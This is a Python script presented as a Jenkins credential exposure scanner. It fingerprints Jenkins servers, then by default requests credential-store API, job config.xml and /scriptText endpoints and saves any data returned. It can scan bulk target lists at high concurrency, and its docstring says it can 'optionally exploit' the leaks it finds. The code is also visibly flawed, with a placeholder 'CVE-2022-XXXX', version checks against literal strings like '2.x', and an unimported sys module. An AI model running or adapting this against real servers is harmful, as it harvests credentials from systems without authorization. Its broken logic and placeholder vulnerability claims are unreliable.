#!/usr/bin/env python3
"""
Jenkins Credential Exposure Scanner
======================================
Scans for exposed Jenkins credentials caused by misconfiguration or
vulnerabilities in popular Jenkins plugins. This scanner can detect 
and optionally exploit credential leaks via publicly accessible endpoints, 
configuration dumps, or other exposed data sources.

Affected vulnerabilities:
  - CVE-2020-2100: Unauthorized Jenkins API access
  - CVE-2022-XXXX: Credentials in improperly protected configuration.xml files
  - General exposure due to insecure configurations or plugin data leaks
  
Usage:
  # Scan a single Jenkins instance for credential exposure
  python jenkins_credential_exposure_scanner.py --target http://jenkins.example.com
  
  # Perform detection-only scan
  python jenkins_credential_exposure_scanner.py --target http://jenkins.example.com --safe
  
  # Bulk scanning from a list of targets
  python jenkins_credential_exposure_scanner.py --list targets.txt --output results.json
  
  # Increase concurrency and skip server certificate verification
  python jenkins_credential_exposure_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2020-2100
  - https://wiki.jenkins.io/display/JENKINS/Security+Advisory
  - https://www.jenkins.io/doc/book/system-administration/security/
"""

import argparse
import asyncio
import json
import re
from datetime import datetime, timezone
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME       = "jenkins_credential_exposure_scanner"
CVE_IDS         = ["CVE-2020-2100", "CVE-2022-XXXX"]
CVSS_MAX        = "9.8"
REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Jenkins-Credential-Scanner)"
}

# Keywords to identify Jenkins servers
JENKINS_INDICATORS = [
    "X-Jenkins",
    "X-Hudson",
    "Jenkins-Crumb",
    "Jenkins-Agent",
    "Jenkins-Credentials",
]

# Known paths to check
DETECTION_PATHS = [
    "/",
    "/login",
    "/script",
    "/credentials/",
    "/whoAmI/",
    "/manage",
    "/view/all/newJob",
]

# Paths known to expose credentials or other sensitive data in certain cases
CREDENTIAL_EXPOSURE_PATHS = [
    "/credentials/store/system/domain/_/api/json",
    "/job/someJob/config.xml",  # Replaceable job path
    "/scriptText",
    "/administrativeMonitor/OldData/manage",
]


# ── Helper Functions ─────────────────────────────────────────────────────────

def parse_version(header_value: str) -> Optional[str]:
    """Extracts the Jenkins version from a response header."""
    matches = re.search(r"X-Jenkins:\s*([\d\.]+)", header_value, re.IGNORECASE)
    return matches.group(1) if matches else None


def check_version_vulnerability(version: str) -> bool:
    """Checks if a Jenkins version is vulnerable based on known CVEs."""
    known_vulnerable_versions = [
        "2.319.1",
        "2.277.x",  # E.g., 2.277.1
        "2.x"
    ]
    return version in known_vulnerable_versions


def extract_api_data(response_text: str) -> Optional[dict]:
    """Parses JSON data from a response to extract credentials."""
    try:
        return json.loads(response_text)
    except json.JSONDecodeError:
        return None


async def safe_request(client: httpx.AsyncClient, url: str, **kwargs):
    """Performs an HTTP GET request and handles exceptions."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT, **kwargs)
        return response
    except (httpx.RequestError, httpx.HTTPStatusError):
        return None


# ── Main Scanner Functionality ───────────────────────────────────────────────

async def detect_jenkins(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """Detects if a target is running Jenkins."""
    try:
        response = await client.get(target, headers=HEADERS)
        for header, value in response.headers.items():
            if any(indicator in header or indicator in value for indicator in JENKINS_INDICATORS):
                version = parse_version(header)
                return version
        return None
    except httpx.RequestError as e:
        print(c(RED, f"Error connecting to {target}: {str(e)}"))
        return None


async def probe_credentials(client: httpx.AsyncClient, target: str, path: str) -> dict:
    """Probes paths for credential exposure."""
    url = target.rstrip("/") + path
    result = {"path": path, "exposed": False}
    response = await safe_request(client, url)
    if response and response.status_code == 200:
        api_data = extract_api_data(response.text)
        if api_data:
            result["exposed"] = True
            result["data"] = api_data
    return result


async def scan_target(client: httpx.AsyncClient, target: str, safe: bool = False) -> dict:
    """Scans a single Jenkins instance."""
    print(c(CYAN, f"[INFO] Scanning {target}..."))

    detected_version = await detect_jenkins(client, target)
    if not detected_version:
        print(c(YELLOW, f"[INFO] {target} does not appear to be Jenkins."))
        return {"target": target, "jenkins": False}

    print(c(GREEN, f"[INFO] {target} is running Jenkins {detected_version}. Vulnerable?: {check_version_vulnerability(detected_version)}"))
    result = {"target": target, "jenkins": True, "version": detected_version, "probes": []}

    if safe:
        return result

    for path in CREDENTIAL_EXPOSURE_PATHS:
        probe_result = await probe_credentials(client, target, path)
        result["probes"].append(probe_result)

    return result


# ── CLI Functions ────────────────────────────────────────────────────────────

async def main():
    parser = argparse.ArgumentParser(description="Jenkins Credential Exposure Scanner")
    parser.add_argument("--target", help="The target Jenkins URL to scan", type=str)
    parser.add_argument("--list", help="File containing list of Jenkins server URLs", type=str)
    parser.add_argument("--output", help="File to save JSON results", type=str)
    parser.add_argument("--safe", help="Detection-only scan", action="store_true")
    parser.add_argument("--concurrency", help="Concurrent scan limit (default 20)", type=int, default=SEMAPHORE_LIMIT)
    parser.add_argument("--no-verify", help="Disable SSL verification", action="store_true")
    args = parser.parse_args()
    
    targets = []
    if args.target:
        targets.append(args.target)
    elif args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f.readlines()]
    else:
        print(c(RED, "[ERROR] Either --target or --list must be provided."))
        sys.exit(1)

    results = []
    semaphore = asyncio.Semaphore(args.concurrency)

    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [run_with_semaphore(semaphore, scan_target, client, target, args.safe) for target in targets]
        results = await asyncio.gather(*tasks)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
    else:
        print(json.dumps(results, indent=4))


async def run_with_semaphore(semaphore, func, *args, **kwargs):
    async with semaphore:
        return await func(*args, **kwargs)


if __name__ == "__main__":
    asyncio.run(main())

